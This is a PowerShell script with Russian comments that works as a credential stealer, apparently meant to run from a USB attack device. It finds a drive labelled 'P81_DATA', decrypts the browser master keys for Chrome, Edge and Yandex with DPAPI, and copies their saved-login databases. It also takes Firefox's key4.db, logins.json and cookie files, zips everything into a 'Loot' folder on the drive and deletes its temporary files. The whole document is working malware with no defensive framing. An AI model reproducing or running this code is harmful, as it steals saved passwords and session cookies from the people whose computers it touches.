# 1. Поиск флешки по метке тома
$usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq "P81_DATA" } | Select-Object -ExpandProperty DriveLetter

if ($usb) {
    $destPath = "$($usb):\Loot"
    if (!(Test-Path $destPath)) { New-Item -ItemType Directory -Path $destPath | Out-Null }
    
    $tmp = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 6 | % {[char]$_}) )"
    New-Item -ItemType Directory -Path $tmp -Force | Out-Null

    Add-Type -AssemblyName System.Security

    # --- БЛОК CHROMIUM (Chrome, Edge, Yandex) ---
    function Get-Key($p, $l) {
        if (Test-Path $p) {
            try {
                $j = Get-Content $p -Raw | ConvertFrom-Json
                $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
                $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e[5..($e.Length-1)], $null, 0)
                "[$l] Key: $([Convert]::ToBase64String($m))" | Out-File -FilePath "$tmp\keys.txt" -Append
                return $true
            } catch { return $false }
        }
        return $false
    }

    $cPaths = @(
        @{n="CH"; p="Google\Chrome\User Data"},
        @{n="ED"; p="Microsoft\Edge\User Data"},
        @{n="YX"; p="Yandex\YandexBrowser\User Data"}
    )

    foreach ($b in $cPaths) {
        $target = Join-Path $env:LOCALAPPDATA $b.p
        if (Test-Path $target) {
            Get-ChildItem -Path $target -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
                $label = "$($b.n)_$($_.Directory.Name)"
                if (Get-Key (Join-Path $target "Local State") $label) {
                    Copy-Item $_.FullName -Destination "$tmp\$label.db" -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }

    # --- БЛОК FIREFOX ---
    $ffPath = Join-Path $env:APPDATA "Mozilla\Firefox\Profiles"
    if (Test-Path $ffPath) {
        $profiles = Get-ChildItem -Path $ffPath -Directory
        foreach ($prof in $profiles) {
            $pName = "FF_$($prof.Name)"
            # Для расшифровки Firefox нужны оба этих файла
            $files = @("key4.db", "logins.json", "cert9.db", "cookies.sqlite")
            foreach ($f in $files) {
                $fPath = Join-Path $prof.FullName $f
                if (Test-Path $fPath) {
                    Copy-Item $fPath -Destination "$tmp\$pName`_$f" -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }

    # 2. Упаковка и перенос на флешку
    if ((Get-ChildItem $tmp).Count -gt 0) {
        $z = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 4 | % {[char]$_}) ).zip"
        Compress-Archive -Path "$tmp\*" -DestinationPath $z -Force
        
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        Move-Item $z "$destPath\loot_$timestamp.zip" -Force
    }

    Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
}
exit
